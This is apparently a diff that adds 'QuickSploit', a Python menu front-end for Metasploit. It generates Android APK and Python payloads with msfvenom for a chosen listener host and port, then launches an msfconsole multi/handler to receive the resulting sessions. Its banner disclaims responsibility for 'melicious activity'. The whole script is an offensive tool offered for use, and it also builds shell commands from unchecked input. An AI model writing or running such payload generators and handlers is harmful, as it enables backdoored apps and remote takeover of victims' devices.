@@ -1,0 +1,182 @@
+#!/usr/bin/python3
+from subprocess import call
+from re import search
+from re import ASCII
+from os import getcwd as pwd
+from threading import Thread
+from Banner import *
+from random import choice
+from time import sleep
+import os
+
+def _quicksploit_banner_():
+
+    print("""{R}========================(R5C)==========================
+╔═══╗╔╗─╔╗╔══╗╔═══╗╔╗╔═╗ ╔═══╗╔═══╗╔╗───╔═══╗╔══╗╔════╗
+║╔═╗║║║─║║╚╣─╝║╔═╗║║║║╔╝ ║╔═╗║║╔═╗║║║───║╔═╗║╚╣─╝║╔╗╔╗║
+║║─║║║║─║║─║║─║║─╚╝║╚╝╝  ║╚══╗║╚═╝║║║───║║─║║─║║─╚╝║║╚╝
+║╚═╝║║║─║║─║║─║║─╔╗║╔╗║  ╚══╗║║╔══╝║║─╔╗║║─║║─║║───║║──
+╚══╗║║╚═╝║╔╣─╗║╚═╝║║║║╚╗ ║╚═╝║║║───║╚═╝║║╚═╝║╔╣─╗──║║──
+───╚╝╚═══╝╚══╝╚═══╝╚╝╚═╝ ╚═══╝╚╝───╚═══╝╚═══╝╚══╝──╚╝──{N} ({Y}v0.0.1{N})
+{R}Note{N}: I'm not responsible for your melicious activity.""".format(N=col(),R=col("R"),Y=col("Y")))
+
+def col(t="N"):
+    if t == "N":
+        return "\u001b[0m"
+    if t == "G":
+        return "\u001b[32;1m"
+    if t == "R":
+        return "\u001b[31;1m"
+    if t == "B":
+        return "\u001b[34m"
+    if t == "Y":
+        return "\u001b[33;1m"
+    if t == "P":
+        return "\u001b[35;1m"
+    if t == "S":
+        return "\u001b[36;1m"
+    if t == "DG":
+        return "\u001b[32m"
+def print_console(host,port,pay):
+    def odd(n):
+        if int(n)%2==0:
+            return 0
+        else:
+            return 0
+    _len1_ = len(host)-3
+    _len2_ = len(port)-3
+    _len3_ = len(pay)-5
+    _lm1_ = "-"*(_len1_)
+    _lm2_ = "-"*(_len2_)
+    _lm3_ = "-"*(_len3_)
+    _ls1_ = " "*(int((_len1_+2)/2)-1)
+    _ls2_ = " "*(_len2_)
+    _ls3_ = " "*(_len3_)
+    print("""{G}+{L1}----------{L2}-------{L3}---+
+|{LS1}{R}LHOST{G}{LS1}| {R}LPORT{G}{LS2}| {R}{:^{LS3}}{G} |
++{L1}-----+----{L2}--+----{L3}---+
+| {N}{:{lh}}{G} | {N}{:^{lp}}{G} | {N}{:^{lP}}{G} |
++{L1}---------{L2}--------{L3}---+\u001b[0m""".format("PAYLOAD",host,port,pay,L1=_lm1_,L2=_lm2_,L3=_lm3_,LS1=_ls1_,LS2=_ls2_,LS3=len(pay),lh=_len1_,lp=_len2_+4,lP=_len3_,R=col("R"),N=col(),G=col("G")))
+
+
+
+def console(payload,host="127.0.0.1",port="4444"):
+    print_console(host,port,payload)
+    sleep(4)
+    call(["msfconsole","-q","-x","use exploit/multi/handler;set lhost "+host+";set lport "+port+";set payload "+payload+";exploit;"])
+
+def Payload(payload,name,host,port):
+    print("[{G}*{N}] Generating payload.".format(G=col("G"),N=col()))
+    P=col("P")
+    N=col()
+    if payload[:5] == "andro":
+        name=name+".apk"
+        print("{P}Apk file{N}: ".format(P=P,N=N)+pwd()+"/"+name)
+    if payload[:5] == "pytho":
+        name=name+".py"
+        print("{P}Python file{N}: ".format(P=P,N=N)+pwd()+"/"+name)
+    os.system("msfvenom -p "+payload+" lhost="+host+" lport="+port+" r"+">"+name)
+
+def banner1():
+    print("""
+ {G}------ Option ------{N}
+ {R} 1 {G}- {N}Android
+ {R} 2 {G}- {N}Modules
+ {R} 3 {G}- {N}Python
+ {R} 4 {G}- {N}Search
+ {R} 5 {G}- {N}Exit
+ {G}--------------------{N}
+                            """.format(G=col("G"),R=col("R"),N=col()))
+
+"  Config  "
+
+conf=open("module.txt","r")
+List={}
+count=0
+for i in conf:
+    List[count]=i.replace("\n","")
+    count+=1
+conf.close()
+
+
+def Search(_word_,List=List):
+    print()
+    print("{S}    ------------------ {} -----------------".format(_word_,G=col("G"),S=col("S"))+col())
+    for i in List:
+        w=search(r"(.*?)"+_word_+"(.*).*",str(List[i]),ASCII)
+        try:
+            print("      "+col("R")+str(i)+col("G")+" - "+col()+w.group())
+        except:
+            pass
+    print(col("S")+"\n       ----------------------------------"+col())
+
+
+def banner2(n,List=List):
+    if n == "1":
+        Search("android")
+        Load("android")
+    elif n == "2":
+        print(col("S")+"\n    ----------------- Modules -----------------"+col())
+        for i in List:
+            print("      "+col("R")+str(i)+col("G")+" - "+col()+List[i])
+        print(col("S")+"\n   -------------------------------------------"+col())
+        Load("module")
+    elif n == "3":
+        Search("python")
+        Load("python")
+    elif n == "4":
+        _search_=input(col("S")+"Search Word"+col()+": ")
+        if _search_=="":
+            print("[{R}!{N}] No Query given".format(R=col("R"),N=col()))
+            banner2("4")
+        else:
+            Search(_search_)
+            Load("search")
+    elif n == "5":
+        raise SystemExit()
+    else:
+        index()
+
+
+def Load(Name="",List=List):
+    _inp_=""
+    print(" {R}     b {G}-{N}  Back\n".format(R=col("R"),G=col("G"),N=col()))
+    while _inp_=="":
+        _inp_=input(col("DG")+"[QSP]["+Name+"] > "+col()).strip()
+        if _inp_=="b":
+            index()
+            break
+        if _inp_ != "":
+            for i in List:
+                if str(i) == _inp_:
+                    host=input(col("R")+"LHOST("+col()+"127.0.0.1"+col("R")+")"+col()+": ").strip()
+                    port=input(col("R")+"LPORT  ("+col()+"4444"+col("R")+")   "+col()+": ").strip()
+                    name=input(col("R")+"Name  ("+col()+"Noname"+col("R")+")  "+col()+": ").strip()
+                    confirm=input(col("Y")+"Enter to exploit..........."+col())
+                    if name == "":
+                        name="Noname"
+                    if port == "":
+                        port="4444"
+                    if host == "":
+                        host="127.0.0.1"
+                    T1=Thread(target=Payload,args=(List[i],name,host,port))
+                    T1.start()
+                    console(List[i],host,port)
+                    break
+            _inp_=""
+
+def index():
+    call(["clear"])
+    B=choice(Blist)
+    print(B)
+    _quicksploit_banner_()
+    banner1()
+    _inp_=input(col("DG")+"[QSP] > "+col()).strip()
+    if _inp_!="":
+        banner2(_inp_)
+    else:
+        index()
+try:
+    index()
+except:
+    raise SystemExit()
